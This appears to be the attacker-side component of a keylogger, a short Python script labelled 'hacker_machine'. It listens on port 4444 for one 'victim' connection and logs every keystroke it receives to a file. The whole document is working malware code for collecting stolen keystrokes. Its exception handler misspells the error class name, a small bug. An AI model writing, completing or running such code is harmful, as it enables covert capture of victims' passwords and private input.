#hacker_machine

import socket 

#setup server to listen for incoming connections
clientAddress = ('127.0.0.1',4444)
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

serversocket.bind(clientAddress)
serversocket.listen(1)

print("Server listening on port 4444....")


#accept a single connection (one victim)
clientsocket,addr = serversocket.accept()
print(f"connection established from {addr}")


#open log file to write the captured keys: 
with open("log.txt" , "a") as log:
    while True:
        try:
            key =clientsocket.recv(1024).decode()

            if key:
                log.write(key)
                log.flush()
                print(f"key recieved: {key}")
            else:
                break       #client disconnected

        except connectionResetError:
            print("Connection lost ... ")
            break


clientsocket.close()
serversocket.close()
